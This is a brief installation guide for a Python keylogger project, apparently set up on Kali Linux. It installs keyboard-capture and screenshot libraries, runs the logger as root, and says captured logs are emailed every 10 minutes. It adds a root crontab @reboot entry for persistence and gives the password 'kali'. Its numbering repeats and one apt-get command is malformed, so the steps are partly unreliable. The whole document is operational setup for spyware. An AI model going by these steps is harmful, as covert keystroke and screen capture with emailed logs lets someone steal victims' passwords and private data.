Installation Guide

1. Install lib keyboard
	'sudo pip3 install keyboard'
2. Run the python script with sudo
	'sudo ./keylogger_project'
3. The log should be emailed every 10 mins
4. Install pyautogui
	'sudo pip3 install pyautogui'
5. Install 'scrot' for Linux to be able to take screenshots
	'sudo apt-get scrot'
4. Switch user to root
	pass 'kali'
5. Make a crontab entry to run script at boot
	'crontab -e'
	choose vim
	Edit crontab
		'@reboot /home/kali/python/keylogger_project/keylogger_project.py'
6. Screenshot logger does not run at boot and has to be started manually.
	'./screenshot.py'
